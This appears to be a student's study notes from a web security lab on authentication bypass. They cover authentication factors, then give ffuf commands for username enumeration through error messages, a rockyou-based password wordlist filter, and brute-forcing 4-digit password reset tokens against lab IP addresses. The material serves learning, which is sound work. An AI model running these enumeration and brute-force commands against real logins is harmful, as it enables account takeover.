#CWES #AuthnenticationBypass 


![[Pasted image 20260529044859.png]]

#### Authentication methods:
**Knowledge:**
- User have to provide something the user knows, ex. password, passphrases, PINs,etc. 

**Ownership:**
- User have to provide something the user owns, ex. physical object, id-card, token or smartphone with authentication app. 

**Inherence:**
- Something the user is or does, ex. biometric factors such as fingerprint, facial patterns, signature. 

#### Single factor vs multi factor:
**Single:**
- ex. only password 

**Multi:**
- password + time-based OTP. 

#### Attack on authentication:
**Attack on knowlege-based authentication:**

**Attack on ownership-based authentication:**

**Attack on inherence-based authentication:**


#### Enumerating users via different error messages:
- The difference in error messages can tell us which usernames are valid users. 
Example of fuzzing for this:
```shell
ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
```
- If we manage to get a list of valid usernames, we could brute force their passwords afterwards.
- NOTE: ffuf pwnbox gave up around 600 requests per sec, while over vpn on my machine gave me under 20 request per sec -> why? -> ffuf gave me today around 500 r/s, could have been technical problems yesterday. 
cookster


#### Brute-forcring passwords of users
Also see: [[Login bruteforce]] 
- Once we know some usernames, we can try to bruteforce the password. We prefer a tailored wordlist - for example tailor it to the company password policy. 
- Wordlist should be as short and fitting as possible 

Example filtering for at least 1 upper, at least 1 lower, at least 1 digit and min length 10: 
```shell
grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
```

#### Attacking password reset tokens:
- Password reset tokens allows an user to reset their password, they are requested by the user in the web application and usually sent via a link on their email.
- If we can get a users reset token, we can reset their password, and get access to their account. 

Weak reset tokens: (0000 - 9999) not recommended 
```shell
seq -w 0 9999 > tokens.txt
```

If we know a password reset has been invoked, then we can try bruteforce the reset token:
```shell
ffuf -w tokens.txt -u http://154.57.164.80:32519/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```